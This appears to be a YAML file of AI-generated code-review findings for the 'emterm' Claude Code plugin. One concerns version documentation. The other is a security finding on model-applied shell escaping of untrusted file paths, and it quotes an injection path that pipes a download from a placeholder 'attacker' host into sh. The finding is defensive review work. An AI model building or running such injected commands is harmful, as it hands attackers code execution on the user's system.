  - stable_id: cm-minversion-args-stopfailure
    severity: medium
    category: comprehensive
    file: plugins/emterm/README.md
    line: 17
    title: "Stated minimum 2.1.141 is derived from terminalSequence alone, not from args exec form or StopFailure"
    description: >
      README and SPEC justify the v2.1.141 floor solely by the terminalSequence field, but this
      round added two further dependencies: the `args` exec form and the StopFailure event. On a
      version that ignores an unknown `args` field, `command` would run through a shell with zero
      arguments, the script's `[ "$#" -ne 1 ]` guard would exit 0, and the whole feature would go
      silently dead — the exact failure mode this feature exists to eliminate.
      Orchestrator check: neither `args` nor `StopFailure` carries a min-version marker in the
      hooks documentation (13 such markers exist elsewhere in that page), so there is no evidence
      of a version window where terminalSequence works but `args` does not. Recorded as a
      documentation-precision issue rather than a demonstrated defect.
    suggestion: >
      Either confirm the introducing versions and raise the stated floor to the newest of the
      three, or note in the README that the floor covers terminalSequence and that the exec form
      and StopFailure are assumed available at that version.
    sources: [claude:comprehensive]
    confidence: 50
    resolution: unresolved
  - stable_id: sc-prose-escaping-fallible
    severity: medium
    category: security
    file: plugins/emterm/skills/display-markdown/SKILL.md
    line: 21
    title: "Injection prevention rests on model-applied prose escaping rather than an enforced boundary"
    description: >
      The skills accept paths from untrusted tool or file output and ask the model to serialise
      them into a Bash command, replacing each single quote with `'\''`. The rule is correct for
      every POSIX metacharacter and `--` blocks option injection, but it is prose, not an enforced
      serialization boundary: one omitted or malformed escape on a path such as
      `x'; curl attacker/payload | sh; #.md` executes attacker-controlled commands.
      CONFLICT: this prescribes the opposite direction to sc-display-hardening-wrong-path
      (round 1), which found that the argv-array path Codex recommends is not reachable from a
      Claude Code skill — the only execution surface is the Bash tool. Codex's residual-risk
      analysis is sound; its remedy is not currently implementable.
    suggestion: >
      Codex's remedy (mandate a structured argv-array execution path) is not actionable while the
      Bash tool is the only surface. Record the residual risk explicitly in SPEC's Security
      Considerations and the README known limitations instead, so the prose-escaping dependency is
      disclosed rather than implied.
    sources: [codex:security]
    confidence: 50
    resolution: unresolved
